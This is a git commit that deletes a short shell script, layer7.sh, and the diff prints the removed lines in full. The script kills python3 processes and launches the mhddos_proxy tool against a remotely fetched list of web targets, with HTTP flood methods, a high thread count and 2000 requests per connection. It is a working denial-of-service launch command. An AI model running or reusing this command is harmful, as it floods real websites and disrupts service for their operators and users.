a9bc939834e053a2c1201bc8027c2801542495a4
sania-owner <saniaowner@ya.ru>
2022-04-05 14:31:34 +0300

    Delete layer7.sh

--- layer7.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-sudo pkill -9 -f "python3"
-cd /root/mhddos_proxy; python3 runner.py -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods STRESS GET -t $1"000" -p 350 --rpc 2000 --debug
-	
